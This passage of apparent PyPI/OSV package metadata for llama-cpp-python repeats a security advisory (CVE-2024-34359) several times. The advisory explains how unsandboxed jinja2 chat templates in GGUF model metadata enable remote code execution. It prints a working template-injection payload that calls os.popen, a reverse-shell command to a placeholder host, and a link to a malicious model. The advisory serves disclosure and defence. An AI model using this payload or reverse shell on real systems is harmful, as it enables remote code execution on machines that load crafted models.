Ignoring lines of unrelated codes.....\n\n        try:\n            self.metadata = self._model.metadata()\n        except Exception as e:\n            self.metadata = {}\n            if self.verbose:\n                print(f\"Failed to load metadata: {e}\", file=sys.stderr)\n\n        if self.verbose:\n            print(f\"Model metadata: {self.metadata}\", file=sys.stderr)\n\n        if (\n            self.chat_format is None\n            and self.chat_handler is None\n            and \"tokenizer.chat_template\" in self.metadata\n        ):\n            chat_format = llama_chat_format.guess_chat_format_from_gguf_metadata(\n                self.metadata\n            )\n\n            if chat_format is not None:\n                self.chat_format = chat_format\n                if self.verbose:\n                    print(f\"Guessed chat format: {chat_format}\", file=sys.stderr)\n            else:\n                template = self.metadata[\"tokenizer.chat_template\"]\n                try:\n                    eos_token_id = int(self.metadata[\"tokenizer.ggml.eos_token_id\"])\n                except:\n                    eos_token_id = self.token_eos()\n                try:\n                    bos_token_id = int(self.metadata[\"tokenizer.ggml.bos_token_id\"])\n                except:\n                    bos_token_id = self.token_bos()\n\n                eos_token = self._model.token_get_text(eos_token_id)\n                bos_token = self._model.token_get_text(bos_token_id)\n\n                if self.verbose:\n                    print(f\"Using gguf chat template: {template}\", file=sys.stderr)\n                    print(f\"Using chat eos_token: {eos_token}\", file=sys.stderr)\n                    print(f\"Using chat bos_token: {bos_token}\", file=sys.stderr)\n\n                self.chat_handler = llama_chat_format.Jinja2ChatFormatter(\n                    template=template,\n                    eos_token=eos_token,\n                    bos_token=bos_token,\n                    stop_token_ids=[eos_token_id],\n                ).to_chat_handler()\n\n        if self.chat_format is None and self.chat_handler is None:\n            self.chat_format = \"llama-2\"\n            if self.verbose:\n                print(f\"Using fallback chat format: {chat_format}\", file=sys.stderr)\n                \n```\n\nIn `llama.py`, `llama-cpp-python` defined the fundamental class for model initialization parsing (Including `NUMA, LoRa settings`, `loading tokenizers,` and stuff ). In our case, we will be focusing on the parts where it processes `metadata`; it first checks if `chat_format` and `chat_handler` are `None` and checks if the key `tokenizer.chat_template` exists in the metadata dictionary `self.metadata`. If it exists, it will try to guess the `chat format` from the `metadata`. If the guess fails, it will get the value of `chat_template` directly from `self.metadata.self.metadata` is set during class initialization and it tries to get the metadata by calling the model's metadata() method, after that, the `chat_template` is parsed into `llama_chat_format.Jinja2ChatFormatter` as params which furthermore stored the `to_chat_handler()` as `chat_handler`\n\n### `llama_chat_format.py` -> `Jinja2ChatFormatter`:\n\n`self._environment =  jinja2.Environment( -> from_string(self.template) -> self._environment.render(`\n\n```python\nclass ChatFormatter(Protocol):\n    \"\"\"Base Protocol for a chat formatter. A chat formatter is a function that\n    takes a list of messages and returns a chat format response which can be used\n    to generate a completion. The response can also include a stop token or list\n    of stop tokens to use for the completion.\"\"\"\n\n    def __call__(\n        self,\n        *,\n        messages: List[llama_types.ChatCompletionRequestMessage],\n        **kwargs: Any,\n    ) -> ChatFormatterResponse: ...\n\n\nclass Jinja2ChatFormatter(ChatFormatter):\n    def __init__(\n        self,\n        template: str,\n        eos_token: str,\n        bos_token: str,\n        add_generation_prompt: bool = True,\n        stop_token_ids: Optional[List[int]] = None,\n    ):\n        \"\"\"A chat formatter that uses jinja2 templates to format the prompt.\"\"\"\n        self.template = template\n        self.eos_token = eos_token\n        self.bos_token = bos_token\n        self.add_generation_prompt = add_generation_prompt\n        self.stop_token_ids = set(stop_token_ids) if stop_token_ids is not None else None\n\n        self._environment = jinja2.Environment(\n            loader=jinja2.BaseLoader(),\n            trim_blocks=True,\n            lstrip_blocks=True,\n        ).from_string(self.template)\n\n    def __call__(\n        self,\n        *,\n        messages: List[llama_types.ChatCompletionRequestMessage],\n        functions: Optional[List[llama_types.ChatCompletionFunction]] = None,\n        function_call: Optional[llama_types.ChatCompletionRequestFunctionCall] = None,\n        tools: Optional[List[llama_types.ChatCompletionTool]] = None,\n        tool_choice: Optional[llama_types.ChatCompletionToolChoiceOption] = None,\n        **kwargs: Any,\n    ) -> ChatFormatterResponse:\n        def raise_exception(message: str):\n            raise ValueError(message)\n\n        prompt = self._environment.render(\n            messages=messages,\n            eos_token=self.eos_token,\n            bos_token=self.bos_token,\n            raise_exception=raise_exception,\n            add_generation_prompt=self.add_generation_prompt,\n            functions=functions,\n            function_call=function_call,\n            tools=tools,\n            tool_choice=tool_choice,\n        )\n\n```\n\nAs we can see in `llama_chat_format.py` -> `Jinja2ChatFormatter`, the constructor `__init__` initialized required `members` inside of the class; Nevertheless, focusing on this line:\n\n```python\n        self._environment = jinja2.Environment(\n            loader=jinja2.BaseLoader(),\n            trim_blocks=True,\n            lstrip_blocks=True,\n        ).from_string(self.template)\n```\n\nFun thing here: `llama_cpp_python` directly loads the `self.template` (`self.template = template` which is the `chat template` located in the `Metadate` that is parsed as a param) via `jinja2.Environment.from_string(` without setting any sandbox flag or using the protected `immutablesandboxedenvironment `class. This is extremely unsafe since the attacker can implicitly tell `llama_cpp_python` to load malicious `chat template` which is furthermore rendered in the `__call__` constructor, allowing RCEs or Denial-of-Service since `jinja2`'s renderer evaluates embed codes like `eval()`, and we can utilize expose method by exploring the attribution such as `__globals__`, `__subclasses__` of pretty much anything.\n\n```python\n    def __call__(\n        self,\n        *,\n        messages: List[llama_types.ChatCompletionRequestMessage],\n        functions: Optional[List[llama_types.ChatCompletionFunction]] = None,\n        function_call: Optional[llama_types.ChatCompletionRequestFunctionCall] = None,\n        tools: Optional[List[llama_types.ChatCompletionTool]] = None,\n        tool_choice: Optional[llama_types.ChatCompletionToolChoiceOption] = None,\n        **kwargs: Any,\n    ) -> ChatFormatterResponse:\n        def raise_exception(message: str):\n            raise ValueError(message)\n\n        prompt = self._environment.render( # rendered!\n            messages=messages,\n            eos_token=self.eos_token,\n            bos_token=self.bos_token,\n            raise_exception=raise_exception,\n            add_generation_prompt=self.add_generation_prompt,\n            functions=functions,\n            function_call=function_call,\n            tools=tools,\n            tool_choice=tool_choice,\n        )\n```\n\n## Exploiting\n\nFor our exploitation, we first downloaded [qwen1_5-0_5b-chat-q2_k.gguf](https://huggingface.co/Qwen/Qwen1.5-0.5B-Chat-GGUF/blob/main/qwen1_5-0_5b-chat-q2_k.gguf) of `Qwen/Qwen1.5-0.5B-Chat-GGUF` on `huggingface` as the base of the exploitation, by importing the file to `Hex-compatible` editors (In my case I used the built-in `Hex editor` or `vscode`), you can try to search for key `chat_template` (imported as `template = self.metadata[\"tokenizer.chat_template\"]` in `llama-cpp-python`):\n\n<img src=\"https://raw.githubusercontent.com/retr0reg/0reg-uploads/main/img/202405021808647.png\" alt=\"image-20240502180804562\" style=\"zoom: 25%;\" />\n\n`qwen1_5-0_5b-chat-q2_k.gguf` appears to be using the OG `role+message` and using the fun `jinja2` syntax. By first replacing the original `chat_template` in `\\x00`, then inserting our SSTI payload. We constructed this payload which firstly iterates over the subclasses of the base class of all classes in Python. The expression `().__class__.__base__.__subclasses__()` retrieves a list of all subclasses of the basic `object` class and then we check if its `warning` by `if \"warning\" in x.__name__`, if it is , we access its module via the `_module` attribute then access Python's built-in functions through `__builtins__` and uses the `__import__` function to import the `os` module and finally we called `os.popen` to `touch /tmp/retr0reg`, create an empty file call `retr0reg` under `/tmp/`\n\n```python\n{% for x in ().__class__.__base__.__subclasses__() %}{% if \"warning\" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(\"touch /tmp/retr0reg\")}}{%endif%}{% endfor %}\n```\n\nin real life exploiting instance, we can change `touch /tmp/retr0reg` into arbitrary codes like `sh -i >& /dev/tcp/<HOST>/<PORT> 0>&1` to create a reverse shell connection to specified host, in our case we are using `touch /tmp/retr0reg` to showcase the exploitability of this vulnerability.\n\n<img src=\"https://raw.githubusercontent.com/retr0reg/0reg-uploads/main/img/202405022009159.png\" alt=\"image-20240502200909127\" style=\"zoom:50%;\" />\n\nAfter these steps, we got ourselves a malicious model with an embedded payload in `chat_template` of the `metahead`, in which will be parsed and rendered by `llama.py:class Llama:init ->  self.chat_handler `-> `llama_chat_format.py:Jinja2ChatFormatter:init ->  self._environment = jinja2.Environment(` -> ``llama_chat_format.py:Jinja2ChatFormatter:call -> self._environment.render(`\n\n*(The uploaded malicious model file is in https://huggingface.co/Retr0REG/Whats-up-gguf )*\n\n```python\nfrom llama_cpp import Llama\n\n# Loading locally:\nmodel = Llama(model_path=\"qwen1_5-0_5b-chat-q2_k.gguf\")\n# Or loading from huggingface:\nmodel = Llama.from_pretrained(\n    repo_id=\"Retr0REG/Whats-up-gguf\",\n    filename=\"qwen1_5-0_5b-chat-q2_k.gguf\",\n    verbose=False\n)\n\nprint(model.create_chat_completion(messages=[{\"role\": \"user\",\"content\": \"what is the meaning of life?\"}]))\n```\n\nNow when the model is loaded whether as ` Llama.from_pretrained` or `Llama` and chatted, our malicious code in the `chat_template` of the `metahead` will be triggered and execute arbitrary code. \n\nPoC video here: https://drive.google.com/file/d/1uLiU-uidESCs_4EqXDiyKR1eNOF1IUtb/view?usp=sharing\n","fixed_in":["0.2.72"],"id":"GHSA-56xg-wfcc-g829","link":"https://osv.dev/vulnerability/GHSA-56xg-wfcc-g829","source":"osv","summary":null,"withdrawn":null}]},"0.2.36":{"info":{"author":"","author_email":"Andrei Betlen <abetlen@gmail.com>","bugtrack_url":null,"classifiers":["Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.12","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"","license":"MIT","maintainer":"","maintainer_email":"","name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":{"Changelog":"https://llama-cpp-python.readthedocs.io/en/latest/changelog/","Documentation":"https://llama-cpp-python.readthedocs.io/en/latest/","Homepage":"https://github.com/abetlen/llama-cpp-python","Issues":"https://github.com/abetlen/llama-cpp-python/issues"},"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.2.36/","requires_dist":["typing-extensions>=4.5.0","numpy>=1.20.0","diskcache>=5.6.1","jinja2>=2.11.3","uvicorn>=0.22.0; extra == \"server\"","fastapi>=0.100.0; extra == \"server\"","pydantic-settings>=2.0.1; extra == \"server\"","sse-starlette>=1.6.1; extra == \"server\"","starlette-context<0.4,>=0.3.6; extra == \"server\"","pytest>=7.4.0; extra == \"test\"","httpx>=0.24.1; extra == \"test\"","scipy>=1.10; extra == \"test\"","black>=23.3.0; extra == \"dev\"","twine>=4.0.2; extra == \"dev\"","mkdocs>=1.4.3; extra == \"dev\"","mkdocstrings[python]>=0.22.0; extra == \"dev\"","mkdocs-material>=9.1.18; extra == \"dev\"","pytest>=7.4.0; extra == \"dev\"","httpx>=0.24.1; extra == \"dev\"","llama_cpp_python[dev,server,test]; extra == \"all\""],"requires_python":">=3.8","summary":"Python bindings for the llama.cpp library","version":"0.2.36","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"6a2502e865aee5472e28ec65ee0994ed9fce179ee106b41a9783e7e1816c557a","md5":"20b2b8dc9f09dd336b4c5f93a39e950c","sha256":"21dba178604d17f40924afbf4b8c56305f951ebf5a6da23097e9ce2874b97cc3"},"downloads":-1,"filename":"llama_cpp_python-0.2.36.tar.gz","has_sig":false,"md5_digest":"20b2b8dc9f09dd336b4c5f93a39e950c","packagetype":"sdist","python_version":"source","requires_python":">=3.8","size":10686777,"upload_time":"2024-01-29T15:48:21","upload_time_iso_8601":"2024-01-29T15:48:21.121281Z","url":"https://files.pythonhosted.org/packages/6a/25/02e865aee5472e28ec65ee0994ed9fce179ee106b41a9783e7e1816c557a/llama_cpp_python-0.2.36.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[{"aliases":["CVE-2024-34359"],"details":"## Description\n\n`llama-cpp-python` depends on class `Llama` in `llama.py` to load `.gguf` llama.cpp or Latency Machine Learning Models. The `__init__` constructor built in the `Llama` takes several parameters to configure the loading and running of the model. Other than `NUMA, LoRa settings`, `loading tokenizers,` and `hardware settings`, `__init__` also loads the `chat template` from targeted `.gguf` 's Metadata and furtherly parses it to `llama_chat_format.Jinja2ChatFormatter.to_chat_handler()` to construct the `self.chat_handler` for this model. Nevertheless, `Jinja2ChatFormatter` parse the `chat template` within the Metadate with sandbox-less `jinja2.Environment`, which is furthermore rendered in `__call__` to construct the `prompt` of interaction. This allows `jinja2` Server Side Template Injection which leads to RCE by a carefully constructed payload.\n\n## Source-to-Sink\n\n### `llama.py` -> `class Llama` -> `__init__`:\n\n```python\nclass Llama:\n    \"\"\"High-level Python wrapper for a llama.cpp model.\"\"\"\n\n    __backend_initialized = False\n\n    def __init__(\n        self,\n        model_path: str,\n\t\t# lots of params; Ignoring\n    ):\n \n        self.verbose = verbose\n\n        set_verbose(verbose)\n\n        if not Llama.__backend_initialized:\n            with suppress_stdout_stderr(disable=verbose):\n                llama_cpp.llama_backend_init()\n            Llama.__backend_initialized = True\n\n\t\t# Ignoring lines of unrelated codes.....\n\n        try:\n            self.metadata = self._model.metadata()\n        except Exception as e:\n            self.metadata = {}\n            if self.verbose:\n                print(f\"Failed to load metadata: {e}\", file=sys.stderr)\n\n        if self.verbose:\n            print(f\"Model metadata: {self.metadata}\", file=sys.stderr)\n\n        if (\n            self.chat_format is None\n            and self.chat_handler is None\n            and \"tokenizer.chat_template\" in self.metadata\n        ):\n            chat_format = llama_chat_format.guess_chat_format_from_gguf_metadata(\n                self.metadata\n            )\n\n            if chat_format is not None:\n                self.chat_format = chat_format\n                if self.verbose:\n                    print(f\"Guessed chat format: {chat_format}\", file=sys.stderr)\n            else:\n                template = self.metadata[\"tokenizer.chat_template\"]\n                try:\n                    eos_token_id = int(self.metadata[\"tokenizer.ggml.eos_token_id\"])\n                except:\n                    eos_token_id = self.token_eos()\n                try:\n                    bos_token_id = int(self.metadata[\"tokenizer.ggml.bos_token_id\"])\n                except:\n                    bos_token_id = self.token_bos()\n\n                eos_token = self._model.token_get_text(eos_token_id)\n                bos_token = self._model.token_get_text(bos_token_id)\n\n                if self.verbose:\n                    print(f\"Using gguf chat template: {template}\", file=sys.stderr)\n                    print(f\"Using chat eos_token: {eos_token}\", file=sys.stderr)\n                    print(f\"Using chat bos_token: {bos_token}\", file=sys.stderr)\n\n                self.chat_handler = llama_chat_format.Jinja2ChatFormatter(\n                    template=template,\n                    eos_token=eos_token,\n                    bos_token=bos_token,\n                    stop_token_ids=[eos_token_id],\n                ).to_chat_handler()\n\n        if self.chat_format is None and self.chat_handler is None:\n            self.chat_format = \"llama-2\"\n            if self.verbose:\n                print(f\"Using fallback chat format: {chat_format}\", file=sys.stderr)\n                \n```\n\nIn `llama.py`, `llama-cpp-python` defined the fundamental class for model initialization parsing (Including `NUMA, LoRa settings`, `loading tokenizers,` and stuff ). In our case, we will be focusing on the parts where it processes `metadata`; it first checks if `chat_format` and `chat_handler` are `None` and checks if the key `tokenizer.chat_template` exists in the metadata dictionary `self.metadata`. If it exists, it will try to guess the `chat format` from the `metadata`. If the guess fails, it will get the value of `chat_template` directly from `self.metadata.self.metadata` is set during class initialization and it tries to get the metadata by calling the model's metadata() method, after that, the `chat_template` is parsed into `llama_chat_format.Jinja2ChatFormatter` as params which furthermore stored the `to_chat_handler()` as `chat_handler`\n\n### `llama_chat_format.py` -> `Jinja2ChatFormatter`:\n\n`self._environment =  jinja2.Environment( -> from_string(self.template) -> self._environment.render(`\n\n```python\nclass ChatFormatter(Protocol):\n    \"\"\"Base Protocol for a chat formatter. A chat formatter is a function that\n    takes a list of messages and returns a chat format response which can be used\n    to generate a completion. The response can also include a stop token or list\n    of stop tokens to use for the completion.\"\"\"\n\n    def __call__(\n        self,\n        *,\n        messages: List[llama_types.ChatCompletionRequestMessage],\n        **kwargs: Any,\n    ) -> ChatFormatterResponse: ...\n\n\nclass Jinja2ChatFormatter(ChatFormatter):\n    def __init__(\n        self,\n        template: str,\n        eos_token: str,\n        bos_token: str,\n        add_generation_prompt: bool = True,\n        stop_token_ids: Optional[List[int]] = None,\n    ):\n        \"\"\"A chat formatter that uses jinja2 templates to format the prompt.\"\"\"\n        self.template = template\n        self.eos_token = eos_token\n        self.bos_token = bos_token\n        self.add_generation_prompt = add_generation_prompt\n        self.stop_token_ids = set(stop_token_ids) if stop_token_ids is not None else None\n\n        self._environment = jinja2.Environment(\n            loader=jinja2.BaseLoader(),\n            trim_blocks=True,\n            lstrip_blocks=True,\n        ).from_string(self.template)\n\n    def __call__(\n        self,\n        *,\n        messages: List[llama_types.ChatCompletionRequestMessage],\n        functions: Optional[List[llama_types.ChatCompletionFunction]] = None,\n        function_call: Optional[llama_types.ChatCompletionRequestFunctionCall] = None,\n        tools: Optional[List[llama_types.ChatCompletionTool]] = None,\n        tool_choice: Optional[llama_types.ChatCompletionToolChoiceOption] = None,\n        **kwargs: Any,\n    ) -> ChatFormatterResponse:\n        def raise_exception(message: str):\n            raise ValueError(message)\n\n        prompt = self._environment.render(\n            messages=messages,\n            eos_token=self.eos_token,\n            bos_token=self.bos_token,\n            raise_exception=raise_exception,\n            add_generation_prompt=self.add_generation_prompt,\n            functions=functions,\n            function_call=function_call,\n            tools=tools,\n            tool_choice=tool_choice,\n        )\n\n```\n\nAs we can see in `llama_chat_format.py` -> `Jinja2ChatFormatter`, the constructor `__init__` initialized required `members` inside of the class; Nevertheless, focusing on this line:\n\n```python\n        self._environment = jinja2.Environment(\n            loader=jinja2.BaseLoader(),\n            trim_blocks=True,\n            lstrip_blocks=True,\n        ).from_string(self.template)\n```\n\nFun thing here: `llama_cpp_python` directly loads the `self.template` (`self.template = template` which is the `chat template` located in the `Metadate` that is parsed as a param) via `jinja2.Environment.from_string(` without setting any sandbox flag or using the protected `immutablesandboxedenvironment `class. This is extremely unsafe since the attacker can implicitly tell `llama_cpp_python` to load malicious `chat template` which is furthermore rendered in the `__call__` constructor, allowing RCEs or Denial-of-Service since `jinja2`'s renderer evaluates embed codes like `eval()`, and we can utilize expose method by exploring the attribution such as `__globals__`, `__subclasses__` of pretty much anything.\n\n```python\n    def __call__(\n        self,\n        *,\n        messages: List[llama_types.ChatCompletionRequestMessage],\n        functions: Optional[List[llama_types.ChatCompletionFunction]] = None,\n        function_call: Optional[llama_types.ChatCompletionRequestFunctionCall] = None,\n        tools: Optional[List[llama_types.ChatCompletionTool]] = None,\n        tool_choice: Optional[llama_types.ChatCompletionToolChoiceOption] = None,\n        **kwargs: Any,\n    ) -> ChatFormatterResponse:\n        def raise_exception(message: str):\n            raise ValueError(message)\n\n        prompt = self._environment.render( # rendered!\n            messages=messages,\n            eos_token=self.eos_token,\n            bos_token=self.bos_token,\n            raise_exception=raise_exception,\n            add_generation_prompt=self.add_generation_prompt,\n            functions=functions,\n            function_call=function_call,\n            tools=tools,\n            tool_choice=tool_choice,\n        )\n```\n\n## Exploiting\n\nFor our exploitation, we first downloaded [qwen1_5-0_5b-chat-q2_k.gguf](https://huggingface.co/Qwen/Qwen1.5-0.5B-Chat-GGUF/blob/main/qwen1_5-0_5b-chat-q2_k.gguf) of `Qwen/Qwen1.5-0.5B-Chat-GGUF` on `huggingface` as the base of the exploitation, by importing the file to `Hex-compatible` editors (In my case I used the built-in `Hex editor` or `vscode`), you can try to search for key `chat_template` (imported as `template = self.metadata[\"tokenizer.chat_template\"]` in `llama-cpp-python`):\n\n<img src=\"https://raw.githubusercontent.com/retr0reg/0reg-uploads/main/img/202405021808647.png\" alt=\"image-20240502180804562\" style=\"zoom: 25%;\" />\n\n`qwen1_5-0_5b-chat-q2_k.gguf` appears to be using the OG `role+message` and using the fun `jinja2` syntax. By first replacing the original `chat_template` in `\\x00`, then inserting our SSTI payload. We constructed this payload which firstly iterates over the subclasses of the base class of all classes in Python. The expression `().__class__.__base__.__subclasses__()` retrieves a list of all subclasses of the basic `object` class and then we check if its `warning` by `if \"warning\" in x.__name__`, if it is , we access its module via the `_module` attribute then access Python's built-in functions through `__builtins__` and uses the `__import__` function to import the `os` module and finally we called `os.popen` to `touch /tmp/retr0reg`, create an empty file call `retr0reg` under `/tmp/`\n\n```python\n{% for x in ().__class__.__base__.__subclasses__() %}{% if \"warning\" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(\"touch /tmp/retr0reg\")}}{%endif%}{% endfor %}\n```\n\nin real life exploiting instance, we can change `touch /tmp/retr0reg` into arbitrary codes like `sh -i >& /dev/tcp/<HOST>/<PORT> 0>&1` to create a reverse shell connection to specified host, in our case we are using `touch /tmp/retr0reg` to showcase the exploitability of this vulnerability.\n\n<img src=\"https://raw.githubusercontent.com/retr0reg/0reg-uploads/main/img/202405022009159.png\" alt=\"image-20240502200909127\" style=\"zoom:50%;\" />\n\nAfter these steps, we got ourselves a malicious model with an embedded payload in `chat_template` of the `metahead`, in which will be parsed and rendered by `llama.py:class Llama:init ->  self.chat_handler `-> `llama_chat_format.py:Jinja2ChatFormatter:init ->  self._environment = jinja2.Environment(` -> ``llama_chat_format.py:Jinja2ChatFormatter:call -> self._environment.render(`\n\n*(The uploaded malicious model file is in https://huggingface.co/Retr0REG/Whats-up-gguf )*\n\n```python\nfrom llama_cpp import Llama\n\n# Loading locally:\nmodel = Llama(model_path=\"qwen1_5-0_5b-chat-q2_k.gguf\")\n# Or loading from huggingface:\nmodel = Llama.from_pretrained(\n    repo_id=\"Retr0REG/Whats-up-gguf\",\n    filename=\"qwen1_5-0_5b-chat-q2_k.gguf\",\n    verbose=False\n)\n\nprint(model.create_chat_completion(messages=[{\"role\": \"user\",\"content\": \"what is the meaning of life?\"}]))\n```\n\nNow when the model is loaded whether as ` Llama.from_pretrained` or `Llama` and chatted, our malicious code in the `chat_template` of the `metahead` will be triggered and execute arbitrary code. \n\nPoC video here: https://drive.google.com/file/d/1uLiU-uidESCs_4EqXDiyKR1eNOF1IUtb/view?usp=sharing\n","fixed_in":["0.2.72"],"id":"GHSA-56xg-wfcc-g829","link":"https://osv.dev/vulnerability/GHSA-56xg-wfcc-g829","source":"osv","summary":null,"withdrawn":null}]},"0.2.37":{"info":{"author":"","author_email":"Andrei Betlen <abetlen@gmail.com>","bugtrack_url":null,"classifiers":["Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.12","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"","license":"MIT","maintainer":"","maintainer_email":"","name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":{"Changelog":"https://llama-cpp-python.readthedocs.io/en/latest/changelog/","Documentation":"https://llama-cpp-python.readthedocs.io/en/latest/","Homepage":"https://github.com/abetlen/llama-cpp-python","Issues":"https://github.com/abetlen/llama-cpp-python/issues"},"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.2.37/","requires_dist":["typing-extensions>=4.5.0","numpy>=1.20.0","diskcache>=5.6.1","jinja2>=2.11.3","uvicorn>=0.22.0; extra == \"server\"","fastapi>=0.100.0; extra == \"server\"","pydantic-settings>=2.0.1; extra == \"server\"","sse-starlette>=1.6.1; extra == \"server\"","starlette-context<0.4,>=0.3.6; extra == \"server\"","pytest>=7.4.0; extra == \"test\"","httpx>=0.24.1; extra == \"test\"","scipy>=1.10; extra == \"test\"","black>=23.3.0; extra == \"dev\"","twine>=4.0.2; extra == \"dev\"","mkdocs>=1.4.3; extra == \"dev\"","mkdocstrings[python]>=0.22.0; extra == \"dev\"","mkdocs-material>=9.1.18; extra == \"dev\"","pytest>=7.4.0; extra == \"dev\"","httpx>=0.24.1; extra == \"dev\"","llama_cpp_python[dev,server,test]; extra == \"all\""],"requires_python":">=3.8","summary":"Python bindings for the llama.cpp library","version":"0.2.37","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"ee82ce00de6b3b2adde8d59791ec986992b4e736da592cfafb22ccbdac14a049","md5":"8e217a7fdda5aa52d072848e1e6f4501","sha256":"a8f7c8d27334c6b38afac9a33f02a90a8a6c3eed15309e4b9315ac13a3cb3c04"},"downloads":-1,"filename":"llama_cpp_python-0.2.37.tar.gz","has_sig":false,"md5_digest":"8e217a7fdda5aa52d072848e1e6f4501","packagetype":"sdist","python_version":"source","requires_python":">=3.8","size":10764974,"upload_time":"2024-01-30T17:29:37","upload_time_iso_8601":"2024-01-30T17:29:37.295181Z","url":"https://files.pythonhosted.org/packages/ee/82/ce00de6b3b2adde8d59791ec986992b4e736da592cfafb22ccbdac14a049/llama_cpp_python-0.2.37.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[{"aliases":["CVE-2024-34359"],"details":"## Description\n\n`llama-cpp-python` depends on class `Llama` in `llama.py` to load `.gguf` llama.cpp or Latency Machine Learning Models. The `__init__` constructor built in the `Llama` takes several parameters to configure the loading and running of the model. Other than `NUMA, LoRa settings`, `loading tokenizers,` and `hardware settings`, `__init__` also loads the `chat template` from targeted `.gguf` 's Metadata and furtherly parses it to `llama_chat_format.Jinja2ChatFormatter.to_chat_handler()` to construct the `self.chat_handler` for this model. Nevertheless, `Jinja2ChatFormatter` parse the `chat template` within the Metadate with sandbox-less `jinja2.Environment`, which is furthermore rendered in `__call__` to construct the `prompt` of interaction. This allows `jinja2` Server Side Template Injection which leads to RCE by a carefully constructed payload.\n\n## Source-to-Sink\n\n### `llama.py` -> `class Llama` -> `__init__`:\n\n```python\nclass Llama:\n    \"\"\"High-level Python wrapper for a llama.cpp model.\"\"\"\n\n    __backend_initialized = False\n\n    def __init__(\n        self,\n        model_path: str,\n\t\t# lots of params; Ignoring\n    ):\n \n        self.verbose = verbose\n\n        set_verbose(verbose)\n\n        if not Llama.__backend_initialized:\n            with suppress_stdout_stderr(disable=verbose):\n                llama_cpp.llama_backend_init()\n            Llama.__backend_initialized = True\n\n\t\t# Ignoring lines of unrelated codes.....\n\n        try:\n            self.metadata = self._model.metadata()\n        except Exception as e:\n            self.metadata = {}\n            if self.verbose:\n                print(f\"Failed to load metadata: {e}\", file=sys.stderr)\n\n        if self.verbose:\n            print(f\"Model metadata: {self.metadata}\", file=sys.stderr)\n\n        if (\n            self.chat_format is None\n            and self.chat_handler is None\n            and \"tokenizer.chat_template\" in self.metadata\n        ):\n            chat_format = llama_chat_format.guess_chat_format_from_gguf_metadata(\n                self.metadata\n            )\n\n            if chat_format is not None:\n                self.chat_format = chat_format\n                if self.verbose:\n                    print(f\"Guessed chat format: {chat_format}\", file=sys.stderr)\n            else:\n                template = self.metadata[\"tokenizer.chat_template\"]\n                try:\n                    eos_token_id = int(self.metadata[\"tokenizer.ggml.eos_token_id\"])\n                except:\n                    eos_token_id = self.token_eos()\n                try:\n                    bos_token_id = int(self.metadata[\"tokenizer.ggml.bos_token_id\"])\n                except:\n                    bos_token_id = self.token_bos()\n\n                eos_token = self._model.token_get_text(eos_token_id)\n                bos_token = self._model.token_get_text(bos_token_id)\n\n                if self.verbose:\n                    print(f\"Using gguf chat template: {template}\", file=sys.stderr)\n                    print(f\"Using chat eos_token: {eos_token}\", file=sys.stderr)\n                    print(f\"Using chat bos_token: {bos_token}\", file=sys.stderr)\n\n                self.chat_handler = llama_chat_format.Jinja2ChatFormatter(\n                    template=template,\n                    eos_token=eos_token,\n                    bos_token=bos_token,\n                    stop_token_ids=[eos_token_id],\n                ).to_chat_handler()\n\n        if self.chat_format is None and self.chat_handler is None:\n            self.chat_format = \"llama-2\"\n            if self.verbose:\n                print(f\"Using fallback chat format: {chat_format}\", file=sys.stderr)\n                \n```\n\nIn `llama.py`, `llama-cpp-python` defined the fundamental class for model initialization parsing (Including `NUMA, LoRa settings`, `loading tokenizers,` and stuff ). In our case, we will be focusing on the parts where it processes `metadata`; it first checks if `chat_format` and `chat_handler` are `None` and checks if the key `tokenizer.chat_template` exists in the metadata dictionary `self.metadata`. If it exists, it will try to guess the `chat format` from the `metadata`. If the guess fails, it will get the value of `chat_template` directly from `self.metadata.self.metadata` is set during class initialization and it tries to get the metadata by calling the model's metadata() method, after that, the `chat_template` is parsed into `llama_chat_format.Jinja2ChatFormatter` as params which furthermore stored the `to_chat_handler()` as `chat_handler`\n\n### `llama_chat_format.py` -> `Jinja2ChatFormatter`:\n\n`self._environment =  jinja2.Environment( -> from_string(self.template) -> self._environment.render(`\n\n```python\nclass ChatFormatter(Protocol):\n    \"\"\"Base Protocol for a chat formatter. A chat formatter is a function that\n    takes a list of messages and returns a chat format response which can be used\n    to generate a completion. The response can also include a stop token or list\n    of stop tokens to use for the completion.\"\"\"\n\n    def __call__(\n        self,\n        *,\n        messages: List[llama_types.ChatCompletionRequestMessage],\n        **kwargs: Any,\n    ) -> ChatFormatterResponse: ...\n\n\nclass Jinja2ChatFormatter(ChatFormatter):\n    def __init__(\n        self,\n        template: str,\n        eos_token: str,\n        bos_token: str,\n        add_generation_prompt: bool = True,\n        stop_token_ids: Optional[List[int]] = None,\n    ):\n        \"\"\"A chat formatter that uses jinja2 templates to format the prompt.\"\"\"\n        self.template = template\n        self.eos_token = eos_token\n        self.bos_token = bos_token\n        self.add_generation_prompt = add_generation_prompt\n        self.stop_token_ids = set(stop_token_ids) if stop_token_ids is not None else None\n\n        self._environment = jinja2.Environment(\n            loader=jinja2.BaseLoader(),\n            trim_blocks=True,\n            lstrip_blocks=True,\n        ).from_string(self.template)\n\n    def __call__(\n        self,\n        *,\n        messages: List[llama_types.ChatCompletionRequestMessage],\n        functions: Optional[List[llama_types.ChatCompletionFunction]] = None,\n        function_call: 